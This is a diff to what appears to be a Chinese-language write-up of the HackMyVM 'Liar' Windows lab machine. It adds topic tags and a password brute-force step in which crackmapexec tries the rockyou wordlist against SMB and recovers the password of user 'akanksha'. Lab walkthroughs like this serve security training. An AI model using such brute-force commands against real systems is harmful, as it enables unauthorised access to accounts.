@@ -8,6 +8,9 @@ categories:
 tags:
   - Hackmyvm
   - Windows Machine
+  - Enumeration
+  - Password Attacks
+  - Privilege Escalation
 ---
 
 ![](/image/hmvmachines/Liar-1.png)
@@ -494,7 +497,11 @@ El comando se ha completado con uno o m s errores.
 
 ## 密码爆破
 ```plain
+┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
+└─# crackmapexec smb 192.168.0.102 -u akanksha -p ../tools/wordlists/kali/rockyou.txt
 
+...
+SMB         192.168.0.102   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl
 ```
 
 得到了用户和密码
